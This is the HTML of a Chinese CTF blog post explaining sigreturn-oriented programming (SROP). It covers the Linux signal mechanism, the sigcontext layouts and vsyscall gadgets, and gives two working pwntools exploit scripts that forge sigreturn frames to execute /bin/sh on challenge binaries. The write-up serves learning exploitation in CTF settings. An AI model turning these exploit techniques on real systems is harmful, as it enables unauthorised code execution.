@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="srop的学习与思考。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Srop">
+<meta property="og:url" content="http://example.com/2022/04/16/Pwn/srop/index.html">
+<meta property="og:site_name" content="Pursue&#39;s blog">
+<meta property="og:description" content="srop的学习与思考。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/16/xBmL3F.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/16/xBmq9U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/16/xBmHhT.png">
+<meta property="article:published_time" content="2022-04-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-28T13:30:08.590Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="srop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/10/16/xBmL3F.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Srop</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/01/CTF/2022ciscn%E5%88%9D%E8%B5%9B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/16/Pwn/srop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/16/Pwn/srop/&text=Srop"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/16/Pwn/srop/&is_video=false&description=Srop"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Srop&body=Check out this article: http://example.com/2022/04/16/Pwn/srop/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/16/Pwn/srop/&name=Srop&description=srop的学习与思考。"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/16/Pwn/srop/&t=Srop"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#srop%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">srop利用原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">signal机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86%E5%92%8Cx64%E7%9A%84sigcontext"><span class="toc-number">1.2.</span> <span class="toc-text">x86和x64的sigcontext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signal%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">signal机制漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">srop基本利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-es-7"><span class="toc-number">2.1.</span> <span class="toc-text">ciscn_2019_es_7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop%E8%BF%9B%E9%98%B6"><span class="toc-number">3.</span> <span class="toc-text">srop进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-call-chains"><span class="toc-number">3.1.</span> <span class="toc-text">system call chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84gadget"><span class="toc-number">3.2.</span> <span class="toc-text">可利用的gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">具体的利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.4.</span> <span class="toc-text">实例</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Srop
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Pursue</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-15T16:00:00.000Z" class="dt-published" itemprop="datePublished">2022-04-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/srop/" rel="tag">srop</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="srop利用原理"><a href="#srop利用原理" class="headerlink" title="srop利用原理"></a>srop利用原理</h2><h3 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h3><p>当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文（<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向sigreturn 的系统调用地址，需要注意的是，这一部分是在用户进程的地址空间的</strong>），在跳转到之前注册好的signal handler中进行处理，等到signal handler返回后，内核为该进程恢复保存的上下文，最终恢复执行。</p>
+<p>具体步骤如下：</p>
+<ol>
+<li>一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息</li>
+<li>一个新的返回地址被添加到栈顶，其指向了sigreturn</li>
+<li>signal handler被调用，signal handler的行动取决于收到什么signal</li>
+<li><strong>signal handler执行完之后，返回地址用于执行sigreturn系统调用</strong></li>
+<li><strong>sigreturn利用signal frame恢复寄存器回到之前的状态</strong></li>
+<li>程序继续执行</li>
+</ol>
+<h3 id="x86和x64的sigcontext"><a href="#x86和x64的sigcontext" class="headerlink" title="x86和x64的sigcontext"></a>x86和x64的sigcontext</h3><ul>
+<li><strong>x86：</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  unsigned short gs, __gsh;</span><br><span class="line">  unsigned short fs, __fsh;</span><br><span class="line">  unsigned short es, __esh;</span><br><span class="line">  unsigned short ds, __dsh;</span><br><span class="line">  unsigned long edi;</span><br><span class="line">  unsigned long esi;</span><br><span class="line">  unsigned long ebp;</span><br><span class="line">  unsigned long esp;</span><br><span class="line">  unsigned long ebx;</span><br><span class="line">  unsigned long edx;</span><br><span class="line">  unsigned long ecx;</span><br><span class="line">  unsigned long eax;</span><br><span class="line">  unsigned long trapno;</span><br><span class="line">  unsigned long err;</span><br><span class="line">  unsigned long eip;</span><br><span class="line">  unsigned short cs, __csh;</span><br><span class="line">  unsigned long eflags;</span><br><span class="line">  unsigned long esp_at_signal;</span><br><span class="line">  unsigned short ss, __ssh;</span><br><span class="line">  struct _fpstate * fpstate;</span><br><span class="line">  unsigned long oldmask;</span><br><span class="line">  unsigned long cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>x64：（大小为0x100)</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">struct _fpstate</span><br><span class="line">&#123;</span><br><span class="line">  /* FPU environment matching the 64-bit FXSAVE layout.  */</span><br><span class="line">  __uint16_t        cwd;</span><br><span class="line">  __uint16_t        swd;</span><br><span class="line">  __uint16_t        ftw;</span><br><span class="line">  __uint16_t        fop;</span><br><span class="line">  __uint64_t        rip;</span><br><span class="line">  __uint64_t        rdp;</span><br><span class="line">  __uint32_t        mxcsr;</span><br><span class="line">  __uint32_t        mxcr_mask;</span><br><span class="line">  struct _fpxreg    _st[8];</span><br><span class="line">  struct _xmmreg    _xmm[16];</span><br><span class="line">  __uint32_t        padding[24];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  __uint64_t r8;</span><br><span class="line">  __uint64_t r9;</span><br><span class="line">  __uint64_t r10;</span><br><span class="line">  __uint64_t r11;</span><br><span class="line">  __uint64_t r12;</span><br><span class="line">  __uint64_t r13;</span><br><span class="line">  __uint64_t r14;</span><br><span class="line">  __uint64_t r15;</span><br><span class="line">  __uint64_t rdi;</span><br><span class="line">  __uint64_t rsi;</span><br><span class="line">  __uint64_t rbp;</span><br><span class="line">  __uint64_t rbx;</span><br><span class="line">  __uint64_t rdx;</span><br><span class="line">  __uint64_t rax;</span><br><span class="line">  __uint64_t rcx;</span><br><span class="line">  __uint64_t rsp;</span><br><span class="line">  __uint64_t rip;</span><br><span class="line">  __uint64_t eflags;</span><br><span class="line">  unsigned short cs;</span><br><span class="line">  unsigned short gs;</span><br><span class="line">  unsigned short fs;</span><br><span class="line">  unsigned short __pad0;</span><br><span class="line">  __uint64_t err;</span><br><span class="line">  __uint64_t trapno;</span><br><span class="line">  __uint64_t oldmask;</span><br><span class="line">  __uint64_t cr2;</span><br><span class="line">  __extension__ union</span><br><span class="line">    &#123;</span><br><span class="line">      struct _fpstate * fpstate;</span><br><span class="line">      __uint64_t __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  __uint64_t __reserved1 [8];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="signal机制漏洞利用"><a href="#signal机制漏洞利用" class="headerlink" title="signal机制漏洞利用"></a>signal机制漏洞利用</h3><ul>
+<li>Signal Frame 被保存在用户的地址空间中，<strong>所以用户是可以读写的</strong>。</li>
+<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，<strong>它并不会去记录这个 signal 对应的 Signal Frame</strong>，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>
+<li><strong>32位sigreturn的系统调用号为77、64位sigreturn的系统调用号为15</strong></li>
+</ul>
+<h2 id="srop基本利用"><a href="#srop基本利用" class="headerlink" title="srop基本利用"></a>srop基本利用</h2><blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_4">SROP - CTF Wiki (ctf-wiki.org)</a></p>
+<p>[(11条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]_Angel~Yan的博客-CSDN博客_ciscn_2019_es_7</a></p>
+</blockquote>
+<h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><p>给了一个gadget：<code>mov rax, 0xf; ret</code>，设置rax的值为15，然后再调用syscall，就可以实现调用sigreturn。</p>
+<p>WP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ciscn_2019_es_7&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 29776)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4004f1</span></span><br><span class="line">gadget = <span class="number">0x4004DA</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = leak_addr - <span class="number">0x118</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = ret</span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(gadget) + p64(syscall) + <span class="built_in">str</span>(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="srop进阶"><a href="#srop进阶" class="headerlink" title="srop进阶"></a>srop进阶</h2><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>当我们希望执行一系列函数的时候，如下图所示：</p>
+<p><img src="https://s1.ax1x.com/2022/10/16/xBmL3F.png" alt="srop1"></p>
+<p>需要注意的是，我们利用SROP需要满足以下条件：</p>
+<ul>
+<li>可以控制栈的内容</li>
+<li>需要知道以下地址：<ul>
+<li>“&#x2F;bin&#x2F;sh”</li>
+<li>signal frame</li>
+<li>syscall</li>
+<li>sigreturn</li>
+</ul>
+</li>
+<li>要有足够大的空间容纳signa frame</li>
+</ul>
+<p>有的时候我们无法找到控制rax的可用gadget，我们可以在调用syscall ret前，利用某些函数的返回值来控制rax，例如read函数</p>
+<h3 id="可利用的gadget"><a href="#可利用的gadget" class="headerlink" title="可利用的gadget"></a>可利用的gadget</h3><p><img src="https://s1.ax1x.com/2022/10/16/xBmq9U.png" alt="srop2"></p>
+<p>该技术将内核中一些变量和特定系统调用的实现映射到用户态，程序在调用时就不需要再切入内核，从而加快执行速度，<strong>vsyscall是从固定地址0xffffffffff600000开始，三个系统调用以0x400字节对齐，其他内存以int3指令填充，权限为可读可执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffff600000:		mov	rax,0x60</span><br><span class="line">0xffffffffff600007:		syscall</span><br><span class="line">0xffffffffff600009:		ret</span><br><span class="line">0xffffffffff60000a:		int3</span><br><span class="line"></span><br><span class="line">0xffffffffff600400:		mov	rax,0xc9</span><br><span class="line">0xffffffffff600407:		syscall</span><br><span class="line">0xffffffffff600409:		ret</span><br><span class="line">0xffffffffff60040a:		int3</span><br><span class="line"></span><br><span class="line">0xffffffffff600800:		mov	rax,0x135</span><br><span class="line">0xffffffffff600807:		syscall</span><br><span class="line">0xffffffffff600809:		ret</span><br><span class="line">0xffffffffff60080a:		int3</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要先控制rax的值为0xf，再调用syscall ret就可以调用sigreturn</p>
+<h3 id="具体的利用流程"><a href="#具体的利用流程" class="headerlink" title="具体的利用流程"></a>具体的利用流程</h3><ol>
+<li>利用栈溢出将返回地址覆盖为sigreturn的地址，并在栈上布置fake frame，结构如下：</li>
+</ol>
+<ul>
+<li><strong>RSP：一个可写的地址</strong></li>
+<li><strong>RIP：syscall ret</strong></li>
+<li><strong>RAX：read的系统调用号</strong></li>
+<li><strong>RDI：文件描述符</strong></li>
+<li><strong>RSI：可写的地址</strong></li>
+<li><strong>RDX：读入的字节数，取306</strong></li>
+</ul>
+<ol start="2">
+<li>sigreturn执行完后，执行syscall ret，向可写的地址读入306个字节，<strong>这块内容要包含3个syscall ret、fake frame和其他代码和数据</strong></li>
+<li>read执行完后，返回值被放入rax中，然后再次执行我们布置的syscall ret，<strong>但由于rax的值为306，即syncfs的系统调用号，而该调用总返回0，0又是read的调用号</strong></li>
+<li>这次执行我们布置的第二个syscall ret，即read的调用，<strong>这时候我们输入的内容不重要，主要是字节数，输入15个字节，即sigreturn的系统调用</strong></li>
+<li>执行第三个syscall ret，即sigreturn，从第二个fake frame中恢复数据，可以是执行execve(“&#x2F;bin&#x2F;sh”, 0, 0)，也可以是调用mprotect</li>
+</ol>
+<p>以下是示意图：</p>
+<p><img src="https://s1.ax1x.com/2022/10/16/xBmHhT.png" alt="srop3"></p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>可使用的gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">add rsp, 0x10</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>这里的利用是参照了上文写的流程，要注意的是，这里运用的gadget多了<code>add rsp,0x10</code>的操作，所以在构造fake_frame和控制程序执行流的时候要额外注意rsp的值。</p>
+<p>WP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./TNT&quot;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">xor_rax = <span class="number">0x4000f2</span></span><br><span class="line">syscall_rsp_ret = <span class="number">0x400100</span></span><br><span class="line">area = <span class="number">0x600000</span></span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_read</span><br><span class="line">frame1.rdi = <span class="number">0</span></span><br><span class="line">frame1.rsi = area</span><br><span class="line">frame1.rdx = <span class="number">306</span></span><br><span class="line">frame1.rsp = area - <span class="number">0x10</span></span><br><span class="line">frame1.rip = syscall_rsp_ret</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(xor_rax)</span><br><span class="line">payload1 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(syscall_rsp_ret)</span><br><span class="line">payload1 += <span class="built_in">str</span>(frame1)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rax = constants.SYS_execve</span><br><span class="line">frame2.rdi = area + <span class="number">8</span>*<span class="number">4</span></span><br><span class="line">frame2.rsi = <span class="number">0</span></span><br><span class="line">frame2.rdx = <span class="number">0</span></span><br><span class="line">frame2.rip = syscall_rsp_ret</span><br><span class="line"></span><br><span class="line">payload2 = p64(syscall_rsp_ret) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload2 += p64(syscall_rsp_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(syscall_rsp_ret)</span><br><span class="line">payload2 += <span class="built_in">str</span>(frame2)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">306</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#srop%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">srop利用原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">signal机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86%E5%92%8Cx64%E7%9A%84sigcontext"><span class="toc-number">1.2.</span> <span class="toc-text">x86和x64的sigcontext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signal%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">signal机制漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">srop基本利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-es-7"><span class="toc-number">2.1.</span> <span class="toc-text">ciscn_2019_es_7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop%E8%BF%9B%E9%98%B6"><span class="toc-number">3.</span> <span class="toc-text">srop进阶</span></a><ol class="toc-child"><li class="toc-item 